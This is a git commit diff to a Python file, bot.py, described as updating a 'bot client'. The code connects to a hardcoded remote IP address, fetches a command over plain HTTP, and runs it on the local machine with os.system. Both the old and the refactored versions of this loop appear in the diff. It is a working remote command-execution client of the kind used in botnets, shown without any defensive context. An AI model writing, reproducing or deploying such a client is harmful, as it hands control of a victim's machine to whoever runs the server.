0eef76a58ea8591810fbeb9b207b05aa6f0da054
Che, Wei Lin <linton.tw@gmail.com>
2015-04-13 11:57:52 +0800

    Update the bot client

--- bot.py
+++ bot.py
@@ -5,21 +5,29 @@ HOST = '140.114.71.175'    # The remote host
 PORT = 5000                # The same port as used by the server
 GET = '/'
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
-s.send("GET %s HTTP/1.0\r\nHost: %s\r\n\r\n" % (GET, HOST))
-data = s.recv(1024)
-string = ""
 
-while len(data):
-    string = string + data
+def getcmd(string):
+    response = string.split('\r\n')
+    print 'Received:', response
+    return response[-1].strip('\n').rstrip('"').lstrip('"')
+
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST, PORT))
+    s.send("GET %s HTTP/1.0\r\nHost: %s\r\n\r\n" % (GET, HOST))
     data = s.recv(1024)
-s.close()
+    string = ""
 
-response = string.split('\r\n')
-command = response[-1]
-print 'Received:', response
-print 'Command:', command
+    while len(data):
+        string = string + data
+        data = s.recv(1024)
+    s.close()
 
-print 'Execute %s' % command
-os.system(command)
+    command = getcmd(string)
+
+    print 'Execute %s' % command
+    os.system(command)
+
+if __name__ == "__main__":
+    main()
